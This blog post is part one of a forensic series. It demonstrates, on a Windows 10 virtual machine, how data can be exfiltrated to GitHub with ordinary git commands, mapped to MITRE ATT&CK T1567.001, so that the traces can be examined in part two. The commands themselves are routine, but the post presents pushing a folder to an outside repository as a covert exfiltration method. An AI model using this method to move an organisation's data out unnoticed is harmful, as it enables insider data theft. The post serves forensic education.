---
title: "Data Exfiltration via Git: A Forensic Investigation. Part 1, Exfiltration"
layout: post
categories: [Windows, Registry]
image:
  path: /assets/2024/dataexfil/data_exfiltration.png
  alt: Data exfiltration
---
In this two-part blog post, we’ll explore how data exfiltration to GitHub can be carried out from a Windows 10 workstation and how to investigate such incidents. Part 1 focuses on how data can be exfiltrated using Git and GitHub. In Part 2, we'll dive into forensic techniques to retrieve evidence of data exfiltration and determine what was sent from the workstation.

## Why Data Security Matters
With data security becoming increasingly [important](https://www.cbi.eu/news/do-not-underestimate-importance-data-security-data-protection-privacy) for organizations, preventing data loss is a top priority. One well-known precaution is disabling write access to USB devices, but that alone doesn’t address all potential threats. A growing concern is data exfiltration via the internet, where sensitive information could be uploaded to external servers or platforms like GitHub, often without raising alarms.

### Understanding Data Exfiltration
[Data exfiltration](https://www.fortinet.com/resources/cyberglossary/data-exfiltration) refers to the unauthorized transfer of data from one device to another, typically from an internal device to an external, unauthorized one. This can be done by external attackers who’ve gained access to your system or by an insider who either knowingly or unknowingly exposes company data.

Data can be exfiltrated in many ways—through email, cloud storage, or even social engineering techniques. However, **Git-based exfiltration** is more unique because it blends with normal development workflows, making it harder to detect.

### Git and GitHub: Tools of Convenience or Risk?
While working on this website, I used [git](https://www.mennovanveenendaal.com/posts/Building-a-website-using-Github-pages/) and GitHub for legitimate purposes, but it became clear how easily these tools could be used for malicious activities, such as covert data exfiltration.

In corporate environments, Git and GitHub are indispensable for software development. However, giving employees more [privileges](https://en.wikipedia.org/wiki/Principle_of_least_privilege), than they need, especially administrative access. This can lead to potential misuse. Developers often request admin rights to, for example, test their code. These rights can allow Git to be installed or manipulated for unauthorized data transfers.

Why does Git-based exfiltration work so well? Because it looks like regular network traffic, blending in with day-to-day activities. For instance, pushing code to a GitHub repository is common for developers, making it an ideal cover for exfiltrating sensitive data unnoticed.

![GitHub](/assets/2024/dataexfil/github.png)
_Fig.1 GitHub Logo_

### MITRE ATT&CK Framework and Data Exfiltration
The MITRE ATT&CK framework is an industry-standard that categorizes various adversary tactics and techniques. The use of Git for exfiltration falls under MITRE ID [T1567.001](https://attack.mitre.org/techniques/T1567/001/), which covers the exfiltration of data via web services like GitHub.

MITRE highlights that adversaries can use GitHub's APIs over HTTPS, providing an additional layer of stealth, as HTTPS is encrypted and widely used in corporate environments. This makes it much harder for traditional security tools to distinguish between legitimate and malicious traffic.

## Setting Up the Workstation for the Investigation
For this investigation, I set up a Windows 10 Home 22H2 virtual machine, updated it, and installed Git (version 2.47.0.windows.1) along with FTK Imager 4.7.1.2 to capture disk images for analysis. This Windows 10 machine served as the workstation from which the data was exfiltrated.

To simulate the exfiltration, I created a Git repository called `exfiltration_test` and a local folder named `secret_code` where the repository was initialized. I added a README file and committed it to GitHub using the following commands:
```shell
git config --global user.email "<my@email.biz>"
git config --global user.name "<user.name>"
echo "# exfiltration_test" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/mennovanveenendaal/exfiltration_test.git
git push -u origin **main**
```

I then downloaded a [Chirpy Theme](https://www.mennovanveenendaal.com/posts/Setting-up-the-Chirpy-theme/) ZIP file (acting as "sensitive data") into the `secret_code` folder.
This folder contained:
- 48 folders
- 198 files
- 493,986 bytes of data (770,048 bytes on disk)

This size discrepancy is due to how files are stored, in clusters [on a disk](https://superuser.com/a/66826).  

### Data Exfiltration Simulation
With everything in place, I simulated data exfiltration by pushing the contents of the `secret_code` folder to GitHub with the following commands:
```shell
git add --all
git commit -m "data exfiltration"
git push -u origin main
```
At this point, the data was successfully exfiltrated to GitHub.
![Repository](/assets/2024/dataexfil/repository.png)
_Fig.2 GitHub repository_

## Next Step: Investigating the Exfiltration (Part 2)
After exfiltrating the data, I powered off the workstation. In Part 2 of this blog series, I will investigate the Windows 10 workstation to determine if data was sent to GitHub and what specific data was exfiltrated. By examining the disk images and log files, I’ll show how forensic analysis can uncover traces of these activities.

_This post is also published on [blog.jdriven.com](https://blog.jdriven.com/2024/10/exfiltration/)_